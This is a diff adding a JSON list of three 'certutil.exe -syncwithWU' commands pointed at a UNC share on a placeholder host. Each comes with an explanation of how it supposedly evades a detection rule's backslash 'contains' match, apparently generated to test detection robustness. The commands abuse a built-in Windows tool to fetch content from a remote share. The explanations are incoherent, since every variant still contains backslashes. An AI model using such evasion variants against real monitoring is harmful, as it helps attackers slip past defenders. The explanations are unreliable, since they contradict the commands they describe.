@@ -1,0 +1,14 @@
+[
+  {
+    "output": "certutil.exe -syncwithWU \"\\TEST-HOST\\share\"",
+    "explanation": "Insertion of quotes around the UNC path to avoid triggering the 'contains' match on the '\\' character."
+  },
+  {
+    "output": "certutil.exe -syncwithWU \\\\TEST-HOST\\share",
+    "explanation": "Replaced single backslash with double backslash to avoid the 'contains' match on the '\\' character."
+  },
+  {
+    "output": "certutil.exe -syncwithWU \\\\TEST-HOST\\\\share",
+    "explanation": "Replaced single backslash with double backslash and normalized path to avoid the 'contains' match on the '\\' character."
+  }
+]
